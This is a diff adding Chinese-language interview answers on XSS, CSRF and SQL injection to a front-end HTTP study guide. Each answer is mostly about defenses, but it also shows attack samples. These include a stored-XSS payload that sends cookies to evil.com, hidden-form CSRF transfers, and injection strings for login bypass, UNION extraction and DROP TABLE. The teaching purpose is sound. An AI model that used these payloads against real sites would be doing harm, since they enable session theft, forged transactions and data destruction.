@@ -2084,12 +2084,637 @@ app.get('/index.html', (req, res) => {
 
 ---
 
+## 18. 什么是 XSS 攻击？如何防范？
+
+**答案：**
+
+### XSS 攻击简介
+
+XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者在网页中注入恶意脚本，当用户访问该页面时，恶意脚本会在用户的浏览器中执行。
+
+### XSS 攻击类型
+
+#### 1. 反射型 XSS（Reflected XSS）
+
+**原理：** 攻击者构造包含恶意脚本的 URL，诱导用户点击，服务器将恶意脚本反射回用户浏览器执行。
+
+```javascript
+// 恶意 URL
+http://example.com/search?q=<script>alert(document.cookie)</script>
+
+// 服务器直接返回
+<div>搜索结果：<script>alert(document.cookie)</script></div>
+```
+
+#### 2. 存储型 XSS（Stored XSS）
+
+**原理：** 攻击者将恶意脚本存储到服务器数据库中，当其他用户访问包含该数据的页面时，恶意脚本被执行。
+
+```javascript
+// 攻击者在评论区提交恶意脚本
+<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
+
+// 其他用户访问评论区时，恶意脚本被执行
+```
+
+#### 3. DOM 型 XSS（DOM-based XSS）
+
+**原理：** 恶意脚本通过修改 DOM 而不是通过服务器反射，完全在客户端执行。
+
+```javascript
+// 恶意 URL
+http://example.com/#<img src=x onerror=alert(document.cookie)>
+
+// JavaScript 代码
+const hash = decodeURIComponent(location.hash.substring(1));
+document.getElementById('content').innerHTML = hash;
+```
+
+### XSS 攻击危害
+
+1. **窃取 Cookie**：获取用户的登录凭证
+2. **劫持会话**：冒充用户进行操作
+3. **钓鱼攻击**：诱导用户输入敏感信息
+4. **恶意操作**：篡改页面内容、执行恶意操作
+5. **传播蠕虫**：自动传播恶意代码
+
+### XSS 防范措施
+
+#### 1. 输入验证和过滤
+
+```javascript
+// 过滤危险字符
+function sanitizeInput(input) {
+  return input
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;')
+    .replace(/\//g, '&#x2F;');
+}
+
+// 使用白名单
+function sanitizeInput(input) {
+  const whitelist = /^[a-zA-Z0-9\s\-_.,!?]+$/;
+  return whitelist.test(input) ? input : '';
+}
+```
+
+#### 2. 输出编码
+
+```javascript
+// HTML 编码
+function escapeHtml(unsafe) {
+  return unsafe
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;")
+    .replace(/'/g, "&#039;");
+}
+
+// JavaScript 编码
+function escapeJs(unsafe) {
+  return unsafe
+    .replace(/\\/g, '\\\\')
+    .replace(/'/g, "\\'")
+    .replace(/"/g, '\\"')
+    .replace(/\n/g, '\\n')
+    .replace(/\r/g, '\\r');
+}
+
+// URL 编码
+const encoded = encodeURIComponent(input);
+```
+
+#### 3. 使用 Content Security Policy（CSP）
+
+```html
+<!-- HTTP 响应头 -->
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com
+
+<!-- 或者在 HTML 中 -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+```
+
+#### 4. HttpOnly Cookie
+
+```javascript
+// 设置 HttpOnly Cookie
+res.cookie('sessionId', sessionId, {
+  httpOnly: true,  // 防止 JavaScript 访问
+  secure: true,    // 只通过 HTTPS 传输
+  sameSite: 'strict'  // 防止 CSRF 攻击
+});
+```
+
+#### 5. 使用安全的 API
+
+```javascript
+// 不安全的 innerHTML
+element.innerHTML = userInput;
+
+// 安全的 textContent
+element.textContent = userInput;
+
+// 使用 DOMPurify 库
+import DOMPurify from 'dompurify';
+const clean = DOMPurify.sanitize(dirtyInput);
+```
+
+#### 6. 验证 Content-Type
+
+```javascript
+// 设置正确的 Content-Type
+res.setHeader('Content-Type', 'application/json');
+res.setHeader('X-Content-Type-Options', 'nosniff');
+```
+
+### XSS 检测工具
+
+1. **XSSer**：自动化的 XSS 检测工具
+2. **OWASP ZAP**：Web 应用安全扫描器
+3. **Burp Suite**：Web 安全测试工具
+
+---
+
+## 19. 什么是 CSRF 攻击？如何防范？
+
+**答案：**
+
+### CSRF 攻击简介
+
+CSRF（Cross-Site Request Forgery，跨站请求伪造）是一种攻击方式，攻击者诱导用户在已认证的网站上执行非预期的操作。
+
+### CSRF 攻击原理
+
+```
+1. 用户登录银行网站（银行网站认证成功，保存 Cookie）
+   |
+   v
+2. 用户访问恶意网站（恶意网站不持有 Cookie）
+   |
+   v
+3. 恶意网站向银行网站发送请求（浏览器自动携带 Cookie）
+   |
+   v
+4. 银行网站认为请求来自用户，执行操作
+```
+
+### CSRF 攻击示例
+
+#### 1. GET 请求攻击
+
+```html
+<!-- 恶意网站 HTML -->
+<img src="http://bank.com/transfer?to=attacker&amount=1000">
+```
+
+#### 2. POST 请求攻击
+
+```html
+<!-- 恶意网站 HTML -->
+<form action="http://bank.com/transfer" method="POST">
+  <input type="hidden" name="to" value="attacker">
+  <input type="hidden" name="amount" value="1000">
+</form>
+<script>document.forms[0].submit();</script>
+```
+
+#### 3. AJAX 请求攻击
+
+```javascript
+// 恶意网站 JavaScript
+fetch('http://bank.com/transfer', {
+  method: 'POST',
+  credentials: 'include',  // 携带 Cookie
+  headers: {
+    'Content-Type': 'application/json'
+  },
+  body: JSON.stringify({
+    to: 'attacker',
+    amount: 1000
+  })
+});
+```
+
+### CSRF 攻击条件
+
+1. **用户已登录目标网站**：浏览器持有有效的 Cookie
+2. **目标网站没有验证请求来源**：没有使用 CSRF Token 等防护措施
+3. **用户访问恶意网站**：在未退出登录的情况下访问恶意网站
+
+### CSRF 防范措施
+
+#### 1. CSRF Token（推荐）
+
+**原理：** 在表单中添加随机 Token，服务器验证 Token 是否正确。
+
+```javascript
+// 生成 Token
+const crypto = require('crypto');
+function generateCsrfToken() {
+  return crypto.randomBytes(32).toString('hex');
+}
+
+// 存储 Token
+app.use((req, res, next) => {
+  const token = generateCsrfToken();
+  req.session.csrfToken = token;
+  res.locals.csrfToken = token;
+  next();
+});
+
+// 渲染表单
+app.get('/transfer', (req, res) => {
+  res.send(`
+    <form action="/transfer" method="POST">
+      <input type="hidden" name="csrf_token" value="${req.session.csrfToken}">
+      <input type="text" name="to">
+      <input type="number" name="amount">
+      <button type="submit">转账</button>
+    </form>
+  `);
+});
+
+// 验证 Token
+app.post('/transfer', (req, res) => {
+  const { csrf_token, to, amount } = req.body;
+
+  if (csrf_token !== req.session.csrfToken) {
+    return res.status(403).send('CSRF Token 验证失败');
+  }
+
+  // 执行转账操作
+  res.send('转账成功');
+});
+```
+
+#### 2. SameSite Cookie 属性
+
+**原理：** 限制 Cookie 在跨站请求中发送。
+
+```javascript
+// 设置 SameSite Cookie
+res.cookie('sessionId', sessionId, {
+  sameSite: 'strict'  // 严格模式：不允许跨站请求携带 Cookie
+});
+
+// 或者
+res.cookie('sessionId', sessionId, {
+  sameSite: 'lax'  // 宽松模式：允许部分安全的跨站请求（如 GET 请求）
+});
+```
+
+**SameSite 属性值：**
+
+| 值 | 说明 |
+|----|------|
+| `Strict` | 完全禁止跨站请求携带 Cookie |
+| `Lax` | 允许部分安全的跨站请求（GET 请求、顶级导航） |
+| `None` | 允许所有跨站请求携带 Cookie（需要设置 Secure） |
+
+#### 3. 验证 Referer 和 Origin
+
+```javascript
+// 验证 Referer
+app.use((req, res, next) => {
+  const referer = req.headers.referer;
+  const origin = req.headers.origin;
+
+  // 验证 Referer 是否来自本站
+  if (referer && !referer.startsWith('https://yourdomain.com')) {
+    return res.status(403).send('非法请求来源');
+  }
+
+  // 验证 Origin
+  if (origin && origin !== 'https://yourdomain.com') {
+    return res.status(403).send('非法请求来源');
+  }
+
+  next();
+});
+```
+
+#### 4. 自定义 Header
+
+```javascript
+// 前端：在请求中添加自定义 Header
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-Requested-With': 'XMLHttpRequest',
+    'Content-Type': 'application/json'
+  },
+  credentials: 'include',
+  body: JSON.stringify({ to: 'attacker', amount: 1000 })
+});
+
+// 后端：验证自定义 Header
+app.use((req, res, next) => {
+  if (req.method === 'POST' && req.headers['x-requested-with'] !== 'XMLHttpRequest') {
+    return res.status(403).send('非法请求');
+  }
+  next();
+});
+```
+
+#### 5. 双重 Cookie 验证
+
+```javascript
+// 生成 Token 并存储在 Cookie 中
+app.use((req, res, next) => {
+  const token = generateCsrfToken();
+  res.cookie('csrf_token', token, { httpOnly: false });
+  req.session.csrfToken = token;
+  next();
+});
+
+// 前端：从 Cookie 中读取 Token 并添加到请求中
+const csrfToken = getCookie('csrf_token');
+fetch('/api/transfer', {
+  method: 'POST',
+  headers: {
+    'X-CSRF-Token': csrfToken
+  },
+  body: JSON.stringify({ to: 'attacker', amount: 1000 })
+});
+
+// 后端：验证 Token
+app.post('/api/transfer', (req, res) => {
+  const csrfToken = req.headers['x-csrf-token'];
+  if (csrfToken !== req.session.csrfToken) {
+    return res.status(403).send('CSRF Token 验证失败');
+  }
+  // 执行操作
+});
+```
+
+### CSRF vs XSS
+
+| 特性 | CSRF | XSS |
+|------|------|-----|
+| 攻击方式 | 伪造用户请求 | 注入恶意脚本 |
+| 执行位置 | 服务器 | 用户浏览器 |
+| 需要 Cookie | 是 | 否 |
+| 防护重点 | 验证请求来源 | 输入验证和输出编码 |
+
+### 最佳实践
+
+1. **使用 CSRF Token**：对于所有状态改变的请求
+2. **设置 SameSite Cookie**：限制跨站请求携带 Cookie
+3. **使用 HTTPS**：防止中间人攻击
+4. **验证 Referer/Origin**：验证请求来源
+5. **使用短生命周期的 Token**：定期更新 Token
+
+---
+
+## 20. 什么是 SQL 注入攻击？如何防范？
+
+**答案：**
+
+### SQL 注入攻击简介
+
+SQL 注入（SQL Injection）是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意 SQL 代码，从而操纵数据库查询。
+
+### SQL 注入攻击原理
+
+```javascript
+// 不安全的代码（拼接 SQL）
+const username = req.body.username;
+const password = req.body.password;
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+
+// 攻击者输入
+username: "admin' --"
+password: "anything"
+
+// 实际执行的 SQL
+SELECT * FROM users WHERE username='admin' --' AND password='anything'
+// 注释掉后面的条件，直接登录 admin 账户
+```
+
+### SQL 注入攻击类型
+
+#### 1. 经典 SQL 注入
+
+```javascript
+// 登录绕过
+username: "admin' OR '1'='1"
+password: "anything"
+
+// 实际执行的 SQL
+SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
+// '1'='1' 永远为真，绕过密码验证
+```
+
+#### 2. 盲注（Blind SQL Injection）
+
+```javascript
+// 布尔盲注
+username: "admin' AND 1=1 --"  // 返回正常
+username: "admin' AND 1=2 --"  // 返回错误
+
+// 时间盲注
+username: "admin' AND SLEEP(5) --"  // 延迟 5 秒
+```
+
+#### 3. Union 查询注入
+
+```javascript
+// 获取其他表的数据
+username: "admin' UNION SELECT username, password FROM users --"
+
+// 实际执行的 SQL
+SELECT * FROM products WHERE name='admin' UNION SELECT username, password FROM users --'
+```
+
+#### 4. 堆叠查询注入
+
+```javascript
+// 执行多个 SQL 语句
+username: "admin'; DROP TABLE users; --"
+
+// 实际执行的 SQL
+SELECT * FROM users WHERE username='admin'; DROP TABLE users; --'
+```
+
+### SQL 注入攻击危害
+
+1. **数据泄露**：获取敏感数据（用户信息、密码等）
+2. **数据篡改**：修改、删除数据库中的数据
+3. **权限提升**：获取管理员权限
+4. **绕过认证**：绕过登录验证
+5. **拒绝服务**：删除表、导致数据库不可用
+
+### SQL 注入防范措施
+
+#### 1. 使用参数化查询（Prepared Statements）- 最有效
+
+```javascript
+// Node.js MySQL
+const mysql = require('mysql');
+const connection = mysql.createConnection({ ... });
+
+// 不安全的拼接
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+
+// 安全的参数化查询
+const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
+connection.query(query, [username, password], (error, results) => {
+  if (error) throw error;
+  // 处理结果
+});
+
+// 使用命名参数
+const query = 'SELECT * FROM users WHERE username = :username AND password = :password';
+connection.query(query, { username, password }, (error, results) => {
+  if (error) throw error;
+});
+```
+
+```javascript
+// Node.js PostgreSQL
+const { Pool } = require('pg');
+const pool = new Pool({ ... });
+
+// 安全的参数化查询
+const query = 'SELECT * FROM users WHERE username = $1 AND password = $2';
+const result = await pool.query(query, [username, password]);
+```
+
+```javascript
+// Node.js MongoDB
+const { MongoClient } = require('mongodb');
+const client = new MongoClient('mongodb://localhost:27017');
+
+// 安全的查询
+const result = await client.db('test').collection('users').findOne({
+  username: username,
+  password: password
+});
+```
+
+#### 2. 使用 ORM（对象关系映射）
+
+```javascript
+// Sequelize
+const { User } = require('./models');
+
+// 安全的查询
+const user = await User.findOne({
+  where: {
+    username: username,
+    password: password
+  }
+});
+
+// TypeORM
+const user = await repository.findOne({
+  where: {
+    username: username,
+    password: password
+  }
+});
+```
+
+#### 3. 输入验证和过滤
+
+```javascript
+// 白名单验证
+function validateUsername(username) {
+  // 只允许字母、数字、下划线
+  const regex = /^[a-zA-Z0-9_]{3,20}$/;
+  return regex.test(username);
+}
+
+// 黑名单过滤（不推荐，容易绕过）
+function sanitizeInput(input) {
+  return input
+    .replace(/'/g, "''")
+    .replace(/"/g, '""')
+    .replace(/;/g, '')
+    .replace(/--/g, '')
+    .replace(/\/\*/g, '')
+    .replace(/\*\//g, '');
+}
+
+// 使用验证库
+const { body, validationResult } = require('express-validator');
+
+app.post('/login', [
+  body('username').isLength({ min: 3, max: 20 }).matches(/^[a-zA-Z0-9_]+$/),
+  body('password').isLength({ min: 6 })
+], (req, res) => {
+  const errors = validationResult(req);
+  if (!errors.isEmpty()) {
+    return res.status(400).json({ errors: errors.array() });
+  }
+  // 处理登录
+});
+```
+
+#### 4. 最小权限原则
+
+```javascript
+// 不要使用 root 用户连接数据库
+// 创建专用数据库用户，只授予必要的权限
+
+// 创建用户
+CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
+
+// 只授予必要的权限
+GRANT SELECT, INSERT, UPDATE ON app_db.users TO 'app_user'@'localhost';
+
+// 不要授予 DROP、ALTER 等危险权限
+```
+
+#### 5. 错误处理
+
+```javascript
+// 不要将数据库错误直接返回给用户
+app.use((err, req, res, next) => {
+  console.error(err);  // 记录到日志
+
+  // 不安全的做法
+  // res.status(500).send(err.message);  // 可能泄露数据库结构
+
+  // 安全的做法
+  res.status(500).send('服务器错误，请稍后重试');
+});
+```
+
+#### 6. 使用 Web 应用防火墙（WAF）
+
+```nginx
+# ModSecurity 规则
+SecRule ARGS "@detectSQLi" \
+  "id:1001,phase:2,deny,status:403,msg:'SQL Injection Attack Detected'"
+```
+
+### SQL 注入检测工具
+
+1. **SQLMap**：自动化的 SQL 注入检测工具
+2. **OWASP ZAP**：Web 应用安全扫描器
+3. **Burp Suite**：Web 安全测试工具
+
+### 最佳实践
+
+1. **始终使用参数化查询**：这是最有效的防范措施
+2. **使用 ORM**：ORM 自动处理参数化查询
+3. **输入验证**：验证所有用户输入
+4. **最小权限原则**：数据库用户只授予必要的权限
+5. **错误处理**：不要将数据库错误直接返回给用户
+6. **定期更新**：保持数据库和应用程序更新
+
+---
+
 ## 总结
 
 HTTP 面试题涵盖了网络协议、安全性、性能优化等多个方面。掌握这些知识点对于前端工程师来说非常重要，可以帮助我们：
 
 1. **优化性能**：通过缓存、CDN、压缩等技术提高页面加载速度
-2. **提高安全性**：防范 XSS、CSRF 等攻击
+2. **提高安全性**：防范 XSS、CSRF、SQL 注入等攻击
 3. **解决问题**：快速定位和解决网络相关问题
 4. **架构设计**：选择合适的技术方案
 
